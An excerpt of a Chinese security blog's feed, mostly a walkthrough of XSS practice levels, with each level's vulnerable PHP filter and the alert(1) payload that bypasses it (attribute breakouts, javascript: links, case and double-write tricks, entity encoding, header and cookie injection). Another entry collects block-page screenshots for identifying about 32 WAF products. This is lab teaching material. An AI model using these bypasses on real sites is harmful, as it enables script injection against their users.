+<br>
+<h2 id="0x03-生无可恋">0x03 生无可恋</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题对$str进行了字符串过滤.将'&lt;' , '&gt;'替换成空格,仍然使用0x02的payload ,只不过这题是将双引号进行闭合,再插入 JS DOM事件代码</p>
+<pre><code class="language-html">payload:
+&quot; onclick=alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x04-没错又是搜索">0x04 没错又是搜索</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题对$str先进行转换小写,然后将&quot;&lt;script&quot;替换成&quot;&lt;scr_ipt&quot; , &quot;on&quot;替换成&quot;o_n&quot;,思路是将双引号和括号闭合,插入超链接a标签,利用href属性执行 JS代码</p>
+<pre><code class="language-html">payloda:
+&quot;&gt; &lt;a href=javascript:alert(1)&gt; //
+</code></pre>
+<br>
+<br>
+<h2 id="0x05-嗯-还是搜索">0x05 嗯 还是搜索</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题进行诸多过滤,但是没有进行大小写限制,所以使用大写0x04的payload进行绕过</p>
+<pre><code class="language-html">payloda:
+&quot;&gt; &lt;a Href=javascript:alert(1)&gt; //
+</code></pre>
+<br>
+<br>
+<h2 id="0x06-猜一猜下面题目还有搜索嘛">0x06 猜一猜下面题目还有搜索嘛</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str =strtolower( $_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题相对于第六题,过滤替换成空,写进行了大小写限制,但是程序只是运行一次,所以可以将标签双写进行绕过</p>
+<pre><code class="language-html">payload:
+&quot;&gt; &lt;scrSCRIPTipt&gt;alert(1)&lt;/scrSCRIPTipt&gt;
+</code></pre>
+<br>
+<br>
+<h2 id="0x07-老铁要和我换友链嘛">0X07 老铁要和我换友链嘛？</h2>
+<pre><code class="language-php+HTML">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot',$str6);
+echo '&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php
+ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">小</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">限</mi><mi mathvariant="normal">制</mi><mi mathvariant="normal">和</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">滤</mi><mo separator="true">,</mo><mi mathvariant="normal">但</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">经</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">滤</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">str进行了小写限制和过滤,但是经过过滤后的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">的</span></span></span></span>str7使用在 a标签的href属性上面,href属性可以使用JavaScript协议来执行JS代码</p>
+<pre><code class="language-html">payload:
+JavaScrip&amp;#x74;:alert(1)
+
+因为&quot;script&quot;会被过滤替换成&quot;scr_ipt&quot;,所以将字母进行编码HTML实体,HTML实体在浏览器解析时会进行解码还原字符
+</code></pre>
+<br>
+<br>
+<h2 id="0x08-添加友连again">0x08 添加友连again</h2>
+<pre><code class="language-php+HTML">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot',$str6);
+echo '&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php
+if(false===strpos($str7,'http://'))
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+        }
+else
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+}
+?&gt;
+</code></pre>
+<p>本题与第八题基本相似,但是加入了一个限制,传入的值必须包含&quot;http://&quot;,但是没有限制出现的位置,所以只要传入的值包含就行</p>
+<pre><code class="language-html">payload:
+JavaScrip&amp;#x74;:alert(1) // http://
+</code></pre>
+<br>
+<br>
+<h2 id="0x09-嗯-搜索又出现了">0x09 嗯 搜索又出现了</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题没有文本框,看代码发现是被设置隐藏了,所以需要将属性进行重写覆盖,对于$str11进行了'&lt;' , '&gt;'过滤,因此使用JS DOM代码事件进行弹窗</p>
+<pre><code class="language-javascript">payload:
+t_sort=&quot; type=text onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x10-为什么这么多搜索呢">0x10 为什么这么多搜索呢</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_REFERER'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题依旧没有文本框 , 但是查看代码是发现 , $str11传值的地方不在URL , 而是在请求头的<a href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">REFERER</a>里面,需要伪造REFERER进行攻击</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-referer.png" alt="" loading="lazy"></figure>
+<pre><code class="language-js">payload
+t_sort=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x11-黑人问号">0x11 黑人问号</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_USER_AGENT'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>本题与第十一题 相似 , 不过本题$str11的传值的地方在请求头的UA里面 , 依旧需要伪造攻击,payload依旧是第十一题的payload</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-user-agent.png" alt="" loading="lazy"></figure>
+<pre><code class="language-js">payload
+t_sort=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x12-做题好爽啊">0x12 做题好爽啊</h2>
+<pre><code class="language-php">&lt;?php
+setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_COOKIE[&quot;user&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>不多说,一条payload打三题😅😅,本题伪造cookie即可,传值变量名记得改一下</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-cookie.png" alt="" loading="lazy"></figure>
+<pre><code class="language-js">user=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
+</code></pre>
+<br>
+<br>
+<h2 id="0x13-恭喜你快要通关了">0x13 恭喜你快要通关了</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;src&quot;];
+echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
+?&gt;
+</code></pre>
+<p><strong>题目提供的Angular JS的链接已经失效,需要替换连接</strong></p>
+<p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include 指令</a></p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
+<pre><code class="language-js">level14.php?src=&quot;level1.php?name=&lt;img src=x onerror=alert('XSS')&gt;&quot;
+</code></pre>
+<br>
+<br>
+<h2 id="0x14-厉害了-word哥">0x14 厉害了 Word哥</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
+$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
+$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
+$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);
+echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
+?&gt;
+</code></pre>
+<p>本题不仅过滤了script,还过滤了空格,因此使用其他其他DOM事件且使用一下制符替换空格即可</p>
+<table>
+<thead>
+<tr>
+<th>制符</th>
+<th>URL编码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>换行(LF) : LineFeed</td>
+<td>%0A</td>
+</tr>
+<tr>
+<td>回车(CR) : CreTurn</td>
+<td>%0D</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-js">payload:
+&lt;img%0asrc=x%0aonerror=alert(1)&gt;
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[转载] | 常见WAF拦截页面汇总]]></title>
+        <id>https://M0kY4n.github.io111/post/zhuan-zai-or-chang-jian-waf-lan-jie-ye-mian-hui-zong/</id>
+        <link href="https://M0kY4n.github.io111/post/zhuan-zai-or-chang-jian-waf-lan-jie-ye-mian-hui-zong/">
+        </link>
+        <updated>2020-10-18T06:06:28.000Z</updated>
+        <content type="html"><![CDATA[<p>#前言</p>
+<blockquote>
+<p>前几天在微信公众号 <font color="#b8dcff">@HACK学习呀</font> 看到一片文章 <a href="https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw">干货 | 常见WAF拦截页面总结</a> , 文中提到一位大佬 <font color="#b8dcff">@madcoding</font> 的一片文章 <a href="https://www.mad-coding.cn/2019/12/19/waf%E7%9A%84%E8%AF%86%E5%88%AB%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%88%E4%B8%8D%E6%96%AD%E8%A1%A5%E5%85%85%EF%BC%89/">WAF的识别与绕过</a> 两篇文章都有相同的资料和不同的资料 , 为了以后方便查阅,所以将两篇文章的资料进行汇总 . 本文所有资料都是根据两篇文章进行整合,所以若有错误的地方,请大佬指出!!!</p>
+</blockquote>
+<br>
+<h2 id="1-360主机卫士或360webscan">1.    360主机卫士或360webscan</h2>
+<figure data-type="image" tabindex="1"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB%E6%88%96360webscan.png?raw=true" alt="360主机卫士或360webscan" loading="lazy"></figure>
+<br>
+<h2 id="2-360网站卫士">2.   360网站卫士</h2>
+<figure data-type="image" tabindex="2"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/360%E7%BD%91%E7%AB%99%E5%8D%AB%E5%A3%AB.png?raw=true" alt="360网站卫士" loading="lazy"></figure>
+<br>
+<h2 id="3-d盾">3.   D盾</h2>
+<figure data-type="image" tabindex="3"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/D%E7%9B%BE.png?raw=true" alt="D盾" loading="lazy"></figure>
+<br>
+<h2 id="4-f5-big-ip">4. F5 BIG-IP</h2>
+<p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-1.png?raw=true" alt="F5 BIG-IP-1" loading="lazy"><br>
+<img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-2.png?raw=true" alt="F5 BIG-IP-2" loading="lazy"><br>
+<img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-3.png?raw=true" alt="F5 BIG-IP-3" loading="lazy"></p>
+<br>
+<h2 id="5-mod_securitypng">5.   Mod_Security.png</h2>
+<figure data-type="image" tabindex="4"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/Mod_Security.png?raw=true" alt="Mod_Security.png" loading="lazy"></figure>
+<br>
+<h2 id="6-naxsi-waf">6.   Naxsi WAF</h2>
+<figure data-type="image" tabindex="5"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/Naxsi%20WAF.png?raw=true" alt="Naxsi WAF" loading="lazy"></figure>
+<br>
+<h2 id="7-openrasp">7.   OpenRASP</h2>
+<figure data-type="image" tabindex="6"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/OpenRASP.png?raw=true" alt="OpenRASP" loading="lazy"></figure>
+<br>
+<h2 id="8-upupw安全防护">8.   UPUPW安全防护</h2>
+<figure data-type="image" tabindex="7"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/UPUPW%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4.png?raw=true" alt="UPUPW安全防护" loading="lazy"></figure>
+<br>
+<h2 id="9-dotdefender">9.   dotDefender</h2>
+<figure data-type="image" tabindex="8"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/dotDefender.png?raw=true" alt="dotDefender" loading="lazy"></figure>
+<br>
+<h2 id="10-云锁">10.  云锁</h2>
+<figure data-type="image" tabindex="9"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E4%BA%91%E9%94%81.png?raw=true" alt="云锁" loading="lazy"></figure>
+<br>
+<h2 id="11-创宇盾">11.  创宇盾</h2>
+<figure data-type="image" tabindex="10"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%88%9B%E5%AE%87%E7%9B%BE.png?raw=true" alt="创宇盾" loading="lazy"></figure>
+<br>
+<h2 id="12-华为云">12.  华为云</h2>
+<figure data-type="image" tabindex="11"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%8D%8E%E4%B8%BA%E4%BA%91.png?raw=true" alt="华为云" loading="lazy"></figure>
+<br>
+<h2 id="13-南京铱讯waf">13.  南京铱讯waf</h2>
+<figure data-type="image" tabindex="12"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%8D%97%E4%BA%AC%E9%93%B1%E8%AE%AF%20waf.png?raw=true" alt="南京铱讯waf" loading="lazy"></figure>
+<br>
+<h2 id="14-奇安信网站卫士">14.  奇安信网站卫士</h2>
+<figure data-type="image" tabindex="13"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%A5%87%E5%AE%89%E4%BF%A1%E7%BD%91%E7%AB%99%E5%8D%AB%E5%A3%AB.png?raw=true" alt="奇安信网站卫士" loading="lazy"></figure>
+<br>
+<h2 id="15-安全狗">15.  安全狗</h2>
+<figure data-type="image" tabindex="14"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E5%85%A8%E7%8B%97.png?raw=true" alt="安全狗" loading="lazy"></figure>
+<br>
+<h2 id="16-安域云waf">16.  安域云WAF</h2>
+<figure data-type="image" tabindex="15"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E5%9F%9F%E4%BA%91WAF.png?raw=true" alt="安域云WAF" loading="lazy"></figure>
+<br>
+<h2 id="17-安恒明御waf">17. 安恒明御WAF</h2>
+<figure data-type="image" tabindex="16"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1WAF.png?raw=true" alt="安恒明御WAF" loading="lazy"></figure>
+<br>
+<h2 id="18-宝塔网站防火墙">18.  宝塔网站防火墙</h2>
+<figure data-type="image" tabindex="17"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%9D%E5%A1%94%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99.png?raw=true" alt="宝塔网站防火墙" loading="lazy"></figure>
+<br>
+<h2 id="19-护卫神">19.  护卫神</h2>
+<figure data-type="image" tabindex="18"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%8A%A4%E5%8D%AB%E7%A5%9E.png?raw=true" alt="护卫神" loading="lazy"></figure>
+<br>
+<h2 id="20-智创防火墙">20.  智创防火墙</h2>
+<figure data-type="image" tabindex="19"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%99%BA%E5%88%9B%E9%98%B2%E7%81%AB%E5%A2%99.png?raw=true" alt="智创防火墙" loading="lazy"></figure>
+<br>
+<h2 id="21-未知云waf">21.  未知云WAF</h2>
+<figure data-type="image" tabindex="20"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%9C%AA%E7%9F%A5%E4%BA%91WAF.png?raw=true" alt="未知云WAF" loading="lazy"></figure>
+<br>
+<h2 id="22-玄武盾">22.  玄武盾</h2>
+<figure data-type="image" tabindex="21"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%8E%84%E6%AD%A6%E7%9B%BE.png?raw=true" alt="玄武盾" loading="lazy"></figure>
+<br>
+<h2 id="23-百度云">23.  百度云</h2>
+<figure data-type="image" tabindex="22"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%99%BE%E5%BA%A6%E4%BA%91.png?raw=true" alt="百度云" loading="lazy"></figure>
+<br>
+<h2 id="24-网宿云">24.  网宿云</h2>
+<p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E5%AE%BF%E4%BA%91-2.png?raw=true" alt="网宿云-1" loading="lazy"><br>
+<img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E5%AE%BF%E4%BA%91.png?raw=true" alt="网宿云-2" loading="lazy"></p>
+<br>
+<h2 id="25-网防g01">25.  网防G01</h2>
+<figure data-type="image" tabindex="23"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E9%98%B2G01.png?raw=true" alt="网防G01" loading="lazy"></figure>
+<br>
+<h2 id="26-腾讯云">26.  腾讯云</h2>
+<figure data-type="image" tabindex="24"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E4%BA%91.png?raw=true" alt="腾讯云" loading="lazy"></figure>
+<br>
+<h2 id="27-腾讯宙斯盾">27.  腾讯宙斯盾</h2>
+<figure data-type="image" tabindex="25"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E5%AE%99%E6%96%AF%E7%9B%BE.png?raw=true" alt="腾讯宙斯盾" loading="lazy"></figure>
+<br>
+<h2 id="28-腾讯门神">28.  腾讯门神</h2>
+<figure data-type="image" tabindex="26"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E9%97%A8%E7%A5%9E.png?raw=true" alt="腾讯门神" loading="lazy"></figure>
+<br>
+<h2 id="29-西数wts-waf">29.  西数WTS-WAF</h2>
+<figure data-type="image" tabindex="27"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%A5%BF%E6%95%B0WTS-WAF.png?raw=true" alt="西数WTS-WAF" loading="lazy"></figure>
+<br>
+<h2 id="30-铱讯waf">30.  铱讯WAF</h2>
+<figure data-type="image" tabindex="28"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%93%B1%E8%AE%AFWAF.png?raw=true" alt="铱讯WAF" loading="lazy"></figure>
+<br>
+<h2 id="31-长亭safeline">31.  长亭SafeLine</h2>
+<figure data-type="image" tabindex="29"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%95%BF%E4%BA%ADSafeLine.png?raw=true" alt="长亭SafeLine" loading="lazy"></figure>
+<br>
+<h2 id="32-阿里云盾">32.  阿里云盾</h2>
+<figure data-type="image" tabindex="30"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BE.png?raw=true" alt="阿里云盾" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[XSS弹窗练习 : xss.haozi.me]]></title>
+        <id>https://M0kY4n.github.io111/post/xsshaozime/</id>
+        <link href="https://M0kY4n.github.io111/post/xsshaozime/">
+        </link>
+        <updated>2020-07-28T12:30:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="xss弹窗闯关练习">XSS弹窗闯关练习</h1>
+<br>
+<h2 id="前言">前言</h2>
+<p>这是一个xss弹窗练习平台，让你一个点一个点的理解 XSS。页面上展现了源码，方便直接，更易理解其原理。</p>
+<blockquote>
+<p>平台地址: https://xss.haozi.me/#/</p>
+</blockquote>
+<p>首次进去需要输入一个昵称,且提醒你<code>请在 input code 框内输入代码，以至弹出 alert(1) 为过关</code></p>
+<br>
+<h2 id="0x00">0x00</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return '&lt;div&gt;' + input + '&lt;/div&gt;'
+}
+
+前端代码:
+&lt;div&gt;&lt;/div&gt;
+</code></pre>
+<p>服务器端没有任何过滤直接执行JavaScript代码即可</p>
+<pre><code class="language-js">payload:
+&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-01.png" alt="" loading="lazy"></figure>
